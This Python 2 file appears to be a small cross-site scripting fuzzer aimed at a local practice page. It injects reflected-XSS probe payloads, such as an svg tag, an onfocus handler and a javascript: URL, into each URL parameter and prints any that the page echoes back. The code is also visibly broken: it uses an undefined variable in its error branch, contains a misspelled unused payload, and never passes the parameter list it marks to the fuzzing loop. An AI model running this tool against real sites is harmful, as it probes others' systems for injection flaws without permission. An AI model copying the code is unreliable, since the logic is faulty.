# coding:utf-8
import requests
import copy
from urlparse import urlparse 
from time import sleep

_version = 1.1
_author = "jijue"

class url_parse:
    def __init__(self,url):
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url 
        url_pared = urlparse(url)

        self.params = dict()
        for i in url_pared.query.split("&"):
            key = i.split("=")[0]
            if len(i.split("=")) == 2:
                value = i.split("=")[1]
            else:
                value = ""
            self.params[key] = value 
        self.scheme = url_pared.scheme
        self.host = url_pared.netloc
        self.path = url_pared.path

def replace_value(payload,paramsdic):
    newdic = copy.deepcopy(paramsdic)
    # print type(newdic)
    for i in newdic.keys():
        if "*" in newdic[i]:
            newdic[i] = payload
    return newdic

def fuzzing(scheme,host,path,paramsdic,GET = True):
    url = scheme + "://" + host + path 
    for pay in payloads:
        sleep(0.5)
        data = replace_value(pay,paramsdic)
        if GET:
            response = requests.get(url,params = data)
        else:
            response = requests.post(url,params = data)
        if pay.lower() in response.text.lower():
            print "[pass] %s " % (pay)

        
payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
alert = "<script>aleert(1)</script>"
url = "http://127.0.0.1:8091/level1.php?name=1*&as=1"

if requests.get(url).status_code == 200:
    pass 
else :
    print "url无法访问 响应码为%d" % (r.status_code)
    exit(0)


urlp = url_parse(url)

for param_name in urlp.params.keys():
    paramslist = copy.deepcopy(urlp.params)
    paramslist[param_name] += "*"
    fuzzing(urlp.scheme,urlp.host,urlp.path,urlp.params)